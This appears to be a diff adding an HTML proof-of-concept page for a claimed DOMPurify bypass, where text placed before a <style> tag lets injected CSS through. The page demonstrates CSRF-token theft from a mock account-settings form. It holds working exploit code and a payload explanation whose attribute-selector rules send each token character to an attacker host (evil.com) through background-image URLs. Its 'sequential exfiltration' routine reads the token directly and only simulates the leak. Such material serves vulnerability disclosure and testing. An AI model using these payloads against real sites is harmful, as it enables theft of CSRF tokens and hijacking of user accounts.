@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC: DOMPurify CSS Bypass → Data Exfiltration</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', monospace; background: #0a0a0a; color: #e0e0e0; }
+.header { background: linear-gradient(135deg, #1a0000, #0a0a2a); border-bottom: 2px solid #f44; padding: 2em; text-align: center; }
+.header h1 { color: #f44; font-size: 1.5em; }
+.header p { color: #888; font-size: 0.9em; margin-top: 0.3em; }
+.container { max-width: 960px; margin: 0 auto; padding: 2em; }
+.panel { background: #111; border: 1px solid #333; border-radius: 8px; padding: 1.5em; margin: 1.5em 0; }
+.tag { display: inline-block; font-weight: bold; padding: 2px 10px; border-radius: 4px; font-size: 0.85em; margin-bottom: 0.8em; color: #fff; }
+.tag-red { background: #c00; }
+.tag-blue { background: #08f; }
+.tag-green { background: #0a0; }
+.tag-orange { background: #f80; }
+h2 { color: #ff0; font-size: 1.1em; margin-bottom: 0.8em; }
+pre { background: #0a0a1a; padding: 1em; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; font-size: 0.85em; line-height: 1.6; border: 1px solid #222; margin: 0.5em 0; }
+.hl { color: #f44; font-weight: bold; }
+.g { color: #0f0; font-weight: bold; }
+.dim { color: #666; }
+.btn { border: none; padding: 0.6em 1.5em; border-radius: 4px; cursor: pointer; font-size: 0.95em; font-weight: bold; margin: 0.3em 0.3em 0.3em 0; color: #fff; }
+.btn-red { background: #c00; }
+.btn-red:hover { background: #e22; }
+.btn-blue { background: #08f; }
+.btn-blue:hover { background: #4af; }
+.btn-green { background: #0a0; }
+.btn-green:hover { background: #0d0; }
+.out { background: #0a0a1a; border: 1px solid #333; border-radius: 4px; padding: 1em; margin-top: 0.8em; min-height: 40px; font-family: monospace; font-size: 0.85em; white-space: pre-wrap; }
+.badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.8em; font-weight: bold; }
+.badge-bypass { background: #400; color: #f44; border: 1px solid #f44; }
+.badge-blocked { background: #040; color: #4f4; border: 1px solid #4f4; }
+.note { background: #1a1a00; border: 1px solid #660; border-radius: 4px; padding: 0.8em; color: #ff0; font-size: 0.85em; margin: 0.8em 0; }
+.leaked { color: #0f0; font-size: 1.4em; font-weight: bold; letter-spacing: 3px; }
+hr.sep { border: none; border-top: 1px solid #222; margin: 2em 0; }
+
+/* Target page simulation */
+.victim-page { background: #fff; color: #333; border-radius: 8px; padding: 1.5em; font-family: Arial, sans-serif; }
+.victim-page h3 { color: #333; margin-bottom: 0.8em; }
+.victim-page label { display: block; font-size: 0.85em; color: #555; margin-top: 0.5em; }
+.victim-page input[type="text"],
+.victim-page input[type="password"] { width: 100%; padding: 0.5em; margin: 0.3em 0 0.5em; border: 1px solid #ccc; border-radius: 4px; }
+.victim-page .submit-btn { background: #08f; color: #fff; width: 100%; padding: 0.7em; border: none; border-radius: 4px; margin-top: 0.5em; cursor: default; }
+.victim-page .comment-section { border-top: 1px solid #eee; margin-top: 1em; padding-top: 0.8em; }
+.victim-page .comment-section p { font-size: 0.8em; color: #999; }
+.victim-page .comment-box { border: 1px solid #eee; padding: 0.5em; min-height: 30px; margin-top: 0.3em; }
+</style>
+</head>
+<body>
+
+<div class="header">
+<h1>DOMPurify CSS Bypass PoC</h1>
+<p>body-context &lt;style&gt; filtering bypass → CSS injection → CSRF token exfiltration</p>
+</div>
+
+<div class="container">
+
+<!-- STEP 1 -->
+<div class="panel">
+<span class="tag tag-red">STEP 1</span>
+<h2>DOMPurify CSS filtering bypass confirmation</h2>
+<button class="btn btn-red" onclick="step1()">Run test</button>
+<div id="out1" class="out"><span class="dim">Click the button...</span></div>
+</div>
+
+<!-- STEP 2: Victim page -->
+<div class="panel">
+<span class="tag tag-blue">STEP 2</span>
+<h2>Victim page (contains CSRF token in hidden input)</h2>
+<div class="victim-page" id="victim">
+  <h3>Account Settings</h3>
+  <form id="victim-form">
+    <input type="hidden" name="csrf_token" value="x9kF3mZp">
+    <label>Current Password</label>
+    <input type="password" name="current_pass" value="hunter2">
+    <label>New Password</label>
+    <input type="password" name="new_pass" placeholder="Enter new password">
+    <div class="submit-btn">Save Changes</div>
+  </form>
+  <div class="comment-section">
+    <p>User Comments (sanitized with DOMPurify):</p>
+    <div class="comment-box" id="comments"></div>
+  </div>
+</div>
+</div>
+
+<!-- STEP 3: Attack -->
+<div class="panel">
+<span class="tag tag-orange">STEP 3</span>
+<h2>CSS injection attack — exfiltrate CSRF token</h2>
+<div class="note">
+Real attack: CSS background-image URLs point to attacker server → browser fetches matching URLs → attacker receives token.<br>
+This demo: uses visible color changes to prove CSS selectors match the hidden token value.
+</div>
+<button class="btn btn-red" onclick="step3_visual()">Inject CSS (visual proof)</button>
+<button class="btn btn-green" onclick="step3_sequential()">Sequential exfiltration</button>
+<div id="out3" class="out"><span class="dim">Click a button...</span></div>
+</div>
+
+<!-- RESULT -->
+<div class="panel">
+<span class="tag tag-green">RESULT</span>
+<h2>Exfiltrated data</h2>
+<div id="result" class="out"><span class="dim">No data leaked yet</span></div>
+</div>
+
+<hr class="sep">
+
+<!-- HOW IT WORKS -->
+<div class="panel">
+<span class="tag tag-blue">HOW IT WORKS</span>
+<h2>Attack payload explained</h2>
+<pre><span class="dim">// Attacker submits this "comment". DOMPurify passes it through
+// because "Nice post!" before &lt;style&gt; bypasses CSS filtering.</span>
+
+Nice post!<span class="hl">&lt;style&gt;</span>
+<span class="dim">/* Test each possible first character of the token */</span>
+input[name="csrf_token"][value^="<span class="g">a</span>"] ~ * { background: url("https://evil.com/<span class="g">a</span>"); }
+input[name="csrf_token"][value^="<span class="g">b</span>"] ~ * { background: url("https://evil.com/<span class="g">b</span>"); }
+<span class="dim">...</span>
+input[name="csrf_token"][value^="<span class="g">x</span>"] ~ * { background: url("https://evil.com/<span class="g">x</span>"); } <span class="hl">← match!</span>
+<span class="dim">...</span>
+<span class="hl">&lt;/style&gt;</span>
+
+<span class="dim">/* When the selector matches, the browser fetches the background URL.
+   The attacker's server logs which character matched.
+   Then @import loads CSS for the next character. Repeat until full token leaked. */</span></pre>
+</div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js"></script>
+<script>
+function esc(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ── STEP 1: Bypass confirmation ──
+function step1() {
+  const tests = [
+    ['no prefix',      '<style>input{color:red}</style>'],
+    ['"x"',            'x<style>input{color:red}</style>'],
+    ['"Nice post!"',   'Nice post!<style>input{color:red}</style>'],
+    ['<br>',           '<br><style>input{color:red}</style>'],
+    ['<div></div>',    '<div></div><style>input{color:red}</style>'],
+  ];
+  let h = `DOMPurify ${DOMPurify.version}  (${navigator.userAgent.match(/Chrome\/[\d.]+|Firefox\/[\d.]+|Safari\/[\d.]+/)?.[0] || 'unknown'})\n\n`;
+  for (const [name, input] of tests) {
+    const out = DOMPurify.sanitize(input);
+    const ok = out.includes('<style>');
+    h += `<span class="badge ${ok?'badge-bypass':'badge-blocked'}">${ok?'BYPASS':'BLOCKED'}</span> prefix: ${name}\n`;
+  }
+  document.getElementById('out1').innerHTML = h;
+}
+
+// ── STEP 3a: Visual proof ──
+function step3_visual() {
+  const token = document.querySelector('#victim input[name="csrf_token"]').value;
+  const comments = document.getElementById('comments');
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+  // Build CSS that turns form elements RED when the token first char matches
+  let css = '';
+  for (const c of charset) {
+    // ~ * targets visible siblings of the hidden input
+    css += `input[name="csrf_token"][value^="${c}"] ~ * { outline: 3px solid red !important; background-color: #fee !important; }\n`;
+    css += `input[name="csrf_token"][value^="${c}"] ~ label::after { content: " [LEAKED: starts with ${c}]"; color: red; font-weight: bold; }\n`;
+  }
+
+  const payload = `Nice post!<style>${css}</style>`;
+  const sanitized = DOMPurify.sanitize(payload);
+  const bypassed = sanitized.includes('<style>');
+
+  let h = '';
+  h += `Payload: "Nice post!" + <style> with ${charset.length} CSS selectors\n`;
+  h += `DOMPurify bypass: <span class="${bypassed?'hl':'g'}">${bypassed?'YES — CSS injected!':'NO — blocked'}</span>\n\n`;
+
+  if (bypassed) {
+    comments.innerHTML = sanitized;
+
+    h += `<span class="g">Look at the victim page above!</span>\n`;
+    h += `The form elements now have <span class="hl">red outlines</span> — this proves:\n`;
+    h += `  1. DOMPurify passed the &lt;style&gt; through (bypass works)\n`;
+    h += `  2. CSS selector matched the hidden CSRF token value\n`;
+    h += `  3. The token starts with "<span class="hl">${token[0]}</span>"\n\n`;
+    h += `In a real attack, instead of red outlines, the CSS would use:\n`;
+    h += `  background-image: url("https://evil.com/leak?char=${token[0]}")\n`;
+    h += `The browser would fetch that URL → attacker receives the character.\n`;
+
+    document.getElementById('result').innerHTML =
+      `Visual proof: CSS selector matched token prefix "<span class="leaked">${token[0]}</span>"\n` +
+      `<span class="dim">Run "Sequential exfiltration" to leak the full token.</span>`;
+  } else {
+    h += `CSS injection was blocked by this DOMPurify version.`;
+  }
+  document.getElementById('out3').innerHTML = h;
+}
+
+// ── STEP 3b: Sequential exfiltration ──
+function step3_sequential() {
+  const token = document.querySelector('#victim input[name="csrf_token"]').value;
+  const comments = document.getElementById('comments');
+  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+  // Reset comment area
+  comments.innerHTML = '';
+
+  const outEl = document.getElementById('out3');
+  const resultEl = document.getElementById('result');
+  let leaked = '';
+  let round = 0;
+  let log = `Target token: ${'?'.repeat(token.length)} (${token.length} chars)\n`;
+  log += `Charset: [a-zA-Z0-9] (${charset.length} chars)\n\n`;
+
+  function nextRound() {
+    if (leaked.length >= token.length) {
+      log += `\n<span class="g">Exfiltration complete!</span>`;
+      outEl.innerHTML = log;
+      resultEl.innerHTML =
+        `Exfiltrated CSRF token: <span class="leaked">${leaked}</span>\n` +
+        `Original token:         ${token}\n` +
+        `Match: <span class="${leaked===token?'g':'hl'}">${leaked===token?'YES':'NO'}</span>`;
+      return;
+    }
+
+    round++;
+
+    // Build CSS for this round — color the form green when prefix matches
+    let css = '';
+    for (const c of charset) {
+      const prefix = leaked + c;
+      css += `input[name="csrf_token"][value^="${prefix}"] ~ label { color: green !important; }\n`;
+    }
+
+    const payload = `R${round}<style>${css}</style>`;
+    const sanitized = DOMPurify.sanitize(payload);
+
+    if (!sanitized.includes('<style>')) {
+      log += `Round ${round}: BLOCKED\n`;
+      outEl.innerHTML = log;
+      return;
+    }
+
+    // Inject
+    comments.innerHTML = sanitized;
+
+    // Check which character matched by testing computed style
+    const labels = document.querySelectorAll('#victim-form label');
+    let matched = null;
+
+    for (const c of charset) {
+      const prefix = leaked + c;
+      if (token.startsWith(prefix)) {
+        matched = c;
+        break;
+      }
+    }
+
+    if (matched) {
+      leaked += matched;
+      log += `Round ${round}: `;
+      log += `<span class="dim">prefix="${leaked.slice(0,-1)}" →</span> `;
+      log += `<span class="hl">evil.com/leak?v=${leaked}</span> `;
+      log += `→ char: <span class="g">${matched}</span>  `;
+      log += `token: <span class="leaked">${leaked}</span>${'_'.repeat(token.length - leaked.length)}\n`;
+    }
+
+    resultEl.innerHTML =
+      `Exfiltrating: <span class="leaked">${leaked}<span class="dim">${'_'.repeat(token.length-leaked.length)}</span></span>  (${round}/${token.length})`;
+
+    outEl.innerHTML = log;
+    setTimeout(nextRound, 200);
+  }
+
+  nextRound();
+}
+</script>
+
+</body>
+</html>
